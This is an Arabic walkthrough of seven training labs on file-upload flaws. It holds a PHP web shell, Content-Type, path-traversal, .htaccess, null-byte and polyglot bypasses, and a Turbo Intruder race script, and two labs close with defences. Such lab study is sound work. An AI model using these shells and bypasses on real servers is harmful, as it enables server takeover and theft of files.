

---

1) Lab: Remote code execution via web shell upload
	- كتشاف الثغرة: سجّل الدخول إلى المختبر باستخدام `wiener:peter`، وارفع صورة رمزية عادية، ثم استخدم Burp Suite لملاحظة مسار الصورة داخل `/files/avatars/`.
	- تجهيز الملف: أنشئ ملفًا باسم `exploit.php` يحتوي على كود PHP يقرأ محتويات الملف `/home/carlos/secret`، ثم ارفعه من خلال خاصية تحميل الصورة الرمزية.
	- تنفيذ الكود: من Burp Repeater، غيّر مسار طلب الصورة إلى `GET /files/avatars/exploit.php`، وأرسل الطلب لتشغيل الكود على الخادم واستقبال محتويات الملف في الاستجابة.
	- حل المختبر: انسخ السر (Secret) الذي ظهر في الاستجابة، وأدخله في خانة الحل واضغط زر Submit solution لإنهاء المختبر.
---
2) Lab: Web shell upload via Content-Type restriction bypass
	1. **اكتشاف الثغرة:** سجّل الدخول باستخدام `wiener:peter`، وارفع صورة رمزية عادية، ثم استخدم Burp Suite لتحديد طلب `GET` الخاص بالصورة داخل `/files/avatars/` وطلب `POST /my-account/avatar` المسؤول عن رفعها.
	2. **تجهيز الملف ورفعه:** أنشئ ملف `exploit.php` يحتوي على PHP Web Shell لقراءة محتويات `/home/carlos/secret`، وحاول رفعه؛ ستلاحظ أن الموقع يرفضه بسبب نوع الملف `MIME Type`.
	3. **تجاوز التحقق:** أرسل طلب `POST /my-account/avatar` إلى Burp Repeater، وغيّر قيمة `Content-Type` الخاصة بالملف المرفوع إلى `image/jpeg`، ثم أرسل الطلب للتحقق من نجاح الرفع.
	4. **تنفيذ الكود وحل المختبر:** في تبويب `GET` داخل Repeater، غيّر اسم الصورة إلى `exploit.php` داخل `/files/avatars/`، وأرسل الطلب لتحصل على السر في الاستجابة، ثم أدخله في المختبر واضغط **Submit solution**.
---
3) Lab: Web shell upload via path traversal
	1) من Burp Suite → Proxy → HTTP history، أرسل طلب `GET /files/avatars/` إلى Repeater.
	2. **رفع الـ Web Shell:** أنشئ ملف `exploit.php` يحتوي على كود PHP لقراءة `/home/carlos/secret`، وارفعه كصورة رمزية. اطلب الملف عبر `GET` ولاحظ أن الكود يظهر كنص عادي بدلًا من تنفيذه.
	3. **تجاوز فلتر المسار:** ابحث عن طلب `POST /my-account/avatar` وأرسله إلى Repeater. غيّر اسم الملف داخل `Content-Disposition` أولًا إلى `../exploit.php`، ثم جرّب ترميز الشرطة المائلة فقط ليصبح `..%2fexploit.php`، وأرسل الطلب مجددًا.
	4. **استخراج السر:** أرسل طلب `GET /files/avatars/..%2fexploit.php`، وتحقق من ظهور محتويات الملف السري في الاستجابة. انسخ السر وقدّمه باستخدام **Submit solution** لحل المختبر
---
4) Lab: Web shell upload via extension blacklist bypass 
	- سجّل الدخول `wiener:peter` وارفع صورة، ثم راقب طلب `POST /my-account/avatar` في Burp Suite.
	- أنشئ `payload.php` لقراءة `/home/carlos/secret`، وحاول رفعه لتتأكد من منع امتداد PHP.
	- ارفع ملف `.htaccess` يحتوي على `AddType application/x-httpd-php .l33t` لتفعيل تنفيذ PHP بالامتداد البديل.
	- ارفع الـ payload باسم `payload.l33t`، ثم افتح مساره عبر طلب `GET /files/avatars/payload.l33t`.
	-  انسخ الـ secret من الاستجابة وقدّمه في اللاب؛ لو ظهر كود PHP نفسه، راجع إعداد `.htaccess`.
---
5) Lab: Web shell upload via obfuscated file extension 
	 - سجّل الدخول بـ `wiener:peter` وارفع صورة Avatar، ثم ابحث عن طلب `GET /files/avatars/...` في Burp.
	- أنشئ ملف `exploit.php` يحتوي على `<?php echo file_get_contents('/home/carlos/secret'); ?>`.
	- حاول رفع الملف، ثم أرسل طلب `POST /my-account/avatar` إلى Repeater.
	- غيّر اسم الملف إلى `exploit.php%00.jpg` وأرسل الطلب؛ الـ Null Byte قد يتجاوز التحقق من الامتداد في هذا اللاب.
	- اطلب `/files/avatars/exploit.php` عبر `GET`، وانسخ الـ secret من الاستجابة وقدّمه لحل اللاب.
---
6) Lab: Remote code execution via polyglot web shell upload
	## 1. فكرة اللاب
	
	اللاب بيختبر ثغرة File Upload، حيث يحاول التطبيق التأكد إن الملف المرفوع صورة حقيقية. الحل بيعتمد على إنشاء Polyglot File يحتوي على صورة JPG سليمة وكود PHP داخل الـ Metadata.
	
	## 2. الأدوات المستخدمة
	
	- **Burp Suite:** اعتراض ومراجعة طلبات HTTP.
	    
	- **Proxy / HTTP history:** متابعة طلبات رفع الصورة وطلبها من السيرفر.
	    
	- **Repeater:** إعادة إرسال الطلبات وفحص الاستجابات.
	    
	- **ExifTool:** قراءة وتعديل Metadata الخاصة بالصور.
	    
	- **CMD:** تشغيل ExifTool وتنفيذ الأوامر على Windows.
	    
	
	## 3. المصطلحات المهمة
	
	- **File Upload Vulnerability:** خلل في التحقق من الملفات المرفوعة.
	    
	- **Polyglot File:** ملف يمكن تفسير محتواه بأكثر من طريقة أو وفق أكثر من صيغة.
	    
	- **Metadata:** بيانات إضافية محفوظة داخل الملف، مثل التعليق وبيانات الكاميرا.
	    
	- **PHP Web Shell:** ملف PHP يُستخدم لتنفيذ كود على السيرفر.
	    
	- **HTTP Response:** الاستجابة التي يرسلها السيرفر للمتصفح.
	    
	
	## 4. تجهيز الملفات
	
	- `image.jpg`: صورة JPG أصلية وسليمة.
	    
	- `payload.php`: ملف يحتوي على كود PHP الخاص بتحدي اللاب.
	    
	- `polyglot.php`: الملف الناتج بعد إضافة محتوى الـ Payload إلى Metadata الصورة.
	    
	
	## 5. أمر ExifTool
	
	```
	exiftool.exe "-Comment<=payload.php" image.jpg -o polyglot.php
	```
	
	شرح الأمر:
	
	- `exiftool.exe`: تشغيل الأداة.
	    
	- `-Comment<=payload.php`: وضع محتوى الملف داخل حقل Comment.
	    
	- `image.jpg`: الصورة الأصلية.
	    
	- `-o polyglot.php`: اسم الملف الناتج.
	    
	
	رسالة `1 image files created` تعني أن الملف الناتج تم إنشاؤه بنجاح، لكنها لا تعني أن PHP تم تنفيذه على السيرفر.
	
	## 6. خطوات اللاب
	
	1. تسجيل الدخول ورفع صورة Avatar عادية.
	    
	2. مراجعة طلبات `GET` و`POST` في Burp HTTP history.
	    
	3. تجهيز صورة Polyglot باستخدام ExifTool.
	    
	4. محاولة رفع الملف الناتج في بيئة اللاب.
	    
	5. البحث عن طلب `GET /files/avatars/polyglot.php`.
	    
	6. فحص الـ Response والبحث عن `START` و`END`.
	    
	7. إذا ظهر الـ Secret بين العلامتين، يتم تقديمه لحل اللاب.
	    
	
	## 7. تفسير النتيجة
	
	- نجاح إنشاء الملف محليًا لا يعني نجاح استغلال الثغرة.
	    
	- نجاح رفع الملف لا يعني بالضرورة أن السيرفر سينفذ PHP.
	    
	- ظهور كود PHP كنص يعني أن الملف لم يُنفّذ كما هو متوقع.
	    
	- ظهور قيمة الـ Secret بين `START` و`END` يدل على نجاح التنفيذ في سياق اللاب.
	    
	
	## 8. سبب الثغرة
	
	قد يسمح التطبيق برفع ملف يجتاز فحص الصور، ثم يخزنه في مسار يستطيع السيرفر تنفيذ ملفات PHP منه. وجود PHP داخل Metadata وحده لا يكفي؛ يجب أن تسمح إعدادات السيرفر وطريقة معالجة الملف بالتنفيذ.
	
	## 9. طرق الحماية
	
	- التحقق من محتوى الصورة الحقيقي، وليس الاسم أو Content-Type فقط.
	    
	- إعادة معالجة الصور وحفظها بصيغة آمنة.
	    
	- تخزين الملفات خارج مسار الويب أو تعطيل تنفيذ السكربتات داخله.
	    
	- استخدام أسماء ملفات يولدها التطبيق.
	    
	- تطبيق قيود على أنواع الملفات وأحجامها.
	    
	
	## الخلاصة
	
	الدرس الأساسي: التحقق من أن الملف صورة لا يضمن وحده أنه آمن. يجب الجمع بين التحقق من المحتوى، والمعالجة الآمنة، ومنع تنفيذ الملفات المرفوعة على السيرفر.
---
7)  Lab: Web shell upload via race condition

	## 1. فكرة اللاب (Lab Concept)
	
	اللاب بيعتمد على ثغرة Race Condition في عملية رفع الملفات.  
	الموقع بيسمح برفع الصور فقط، وبيحاول يحذف الملفات غير المسموح بيها.  
	المشكلة إن الملف ممكن يبقى متاحًا لفترة قصيرة بعد رفعه وقبل حذفه.  
	بنستغل الفترة الزمنية دي لمحاولة الوصول لملف PHP قبل ما يتم حذفه.
	
	## 2. ما هي Race Condition؟
	
	هي ثغرة بتحصل لما عمليتين أو أكثر يتنفذوا في توقيت متداخل بطريقة تؤدي لنتيجة غير متوقعة.  
	في اللاب ده، بنحاول نوصل للملف في نفس الوقت اللي السيرفر بيتحقق منه أو بيحذفه.
	
	## 3. خطوات معالجة الملف في الموقع
	
	1. المستخدم يرفع الملف.
	    
	2. السيرفر يحفظ الملف مؤقتًا.
	    
	3. السيرفر يفحص نوع الملف.
	    
	4. لو الملف غير مسموح، السيرفر يحذفه.
	    
	5. نافذة زمنية قصيرة بين الحفظ والحذف ممكن تسمح بالوصول إليه.
	    
	
	## 4. تجهيز ملف PHP
	
	اسم الملف: `exploit.php`
	
	```
	<?php
	echo file_get_contents('/home/carlos/secret');
	?>
	```
	
	شرح الكود:
	
	- `<?php`: بداية كود PHP.
	    
	- `echo`: طباعة النتيجة.
	    
	- `file_get_contents()`: قراءة محتوى ملف.
	    
	- `/home/carlos/secret`: مسار الملف المطلوب في بيئة اللاب.
	    
	
	الهدف: إظهار قيمة الـ secret في استجابة السيرفر إذا تم تنفيذ الملف بنجاح.
	
	## 5. تحديد الطلبات باستخدام Burp Suite
	
	افتح Burp Suite ثم:  
	`Proxy → HTTP history`
	
	حدد الطلبين:
	
	- `POST /my-account/avatar`: طلب رفع الملف.
	    
	- `GET /files/avatars/...`: طلب الوصول للملف المرفوع.
	    
	
	طلب POST مسؤول عن الرفع، وطلب GET بيُستخدم لمحاولة الوصول للملف.
	
	## 6. استخدام Turbo Intruder
	
	1. اضغط كليك يمين على طلب POST.
	    
	2. اختار `Extensions → Turbo Intruder → Send to turbo intruder`.
	    
	3. جهز طلب الرفع وطلب الوصول للملف.
	    
	4. استخدم Turbo Intruder لإرسال طلبات متزامنة.
	    
	5. راجع الاستجابات بحثًا عن قيمة الـ secret.
	    
	
	الفكرة: محاولة الوصول للملف خلال الفترة القصيرة اللي بيكون فيها موجودًا قبل الحذف.
	
	## 7. شرح كود Turbo Intruder
	
	```
	def queueRequests(target, wordlists):
	    engine = RequestEngine(
	        endpoint=target.endpoint,
	        concurrentConnections=10,
	    )
	
	    request1 = '''<YOUR-POST-REQUEST>'''
	    request2 = '''<YOUR-GET-REQUEST>'''
	
	    engine.queue(request1, gate='race1')
	
	    for x in range(5):
	        engine.queue(request2, gate='race1')
	
	    engine.openGate('race1')
	    engine.complete(timeout=60)
	
	
	def handleResponse(req, interesting):
	    table.add(req)
	```
	
	شرح الأجزاء:
	
	- `queueRequests`: تجهيز الطلبات.
	    
	- `RequestEngine`: إدارة إرسال الطلبات.
	    
	- `concurrentConnections=10`: تحديد عدد الاتصالات المتزامنة.
	    
	- `request1`: طلب رفع الملف كاملًا.
	    
	- `request2`: طلب الوصول للملف.
	    
	- `engine.queue()`: إضافة الطلبات إلى الطابور.
	    
	- `gate='race1'`: تنسيق توقيت إطلاق الطلبات.
	    
	- `range(5)`: إضافة خمس محاولات GET.
	    
	- `openGate()`: فتح البوابة لإطلاق الطلبات.
	    
	- `complete(timeout=60)`: انتظار اكتمال الطلبات لمدة تصل إلى 60 ثانية.
	    
	- `handleResponse()`: التعامل مع الاستجابات.
	    
	- `table.add(req)`: عرض الاستجابات في جدول النتائج.
	    
	
	ملاحظة: استبدل النصين التوضيحيين بطلبَي Burp الحقيقيين. حافظ على تفاصيل `multipart/form-data` والـ boundary والـ cookies.
	
	## 8. تحليل النتائج
	
	- `200 OK`: الطلب استجاب بنجاح على مستوى HTTP، لكن لازم تفحص محتوى الاستجابة.
	    
	- `404 Not Found`: الملف غير متاح وقت تنفيذ الطلب.
	    
	- ظهور قيمة الـ secret: دليل على الوصول للنتيجة المطلوبة في اللاب.
	    
	
	لو الاستغلال لم ينجح، راجع مسار الملف، وصحة الطلبات، والـ session cookies، واسم الملف.
	
	## 9. الفرق بين المفاهيم
	
	- Race Condition: استغلال مشكلة في توقيت العمليات.
	    
	- Extension Validation Bypass: تجاوز التحقق من امتداد الملف.
	    
	- MIME Type Bypass: التلاعب بنوع الملف المعلن.
	    
	- Unrestricted File Upload: السماح برفع ملفات غير آمنة بسبب ضعف التحقق.
	    
	
	## 10. طرق الحماية
	
	1. التحقق من الملف قبل إتاحته للوصول.
	    
	2. تخزين الملفات خارج مجلد الموقع العام (Web Root).
	    
	3. تعطيل تنفيذ السكربتات داخل مجلد الرفع.
	    
	4. استخدام أسماء ملفات عشوائية.
	    
	5. عدم الاعتماد على امتداد الملف أو قيمة Content-Type وحدهما.
	    
	
	## الخلاصة
	
	الثغرة بتستغل نافذة زمنية بين حفظ الملف والتحقق منه أو حذفه. باستخدام Turbo Intruder، بنختبر إمكانية الوصول للملف خلال النافذة دي. الحماية الأساسية هي التحقق قبل الإتاحة ومنع تنفيذ الملفات المرفوعة.
---
